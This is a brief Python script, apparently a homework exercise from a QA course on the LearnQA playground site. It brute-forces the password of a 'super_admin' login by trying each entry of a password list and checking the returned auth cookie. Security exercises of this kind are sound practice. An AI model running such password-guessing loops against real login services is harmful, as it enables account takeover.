...
for password in password_list:
    getAuthCookie = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework',
                                  params={"login": "super_admin", 'password': password})
    auth_cookie = getAuthCookie.cookies['auth_cookie']
    try_auth = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie',
                             cookies={"auth_cookie": auth_cookie})
    if try_auth.text != "You are NOT authorized":
        print(f"Пароль:{password}, сообщение: {try_auth.text}")
        break
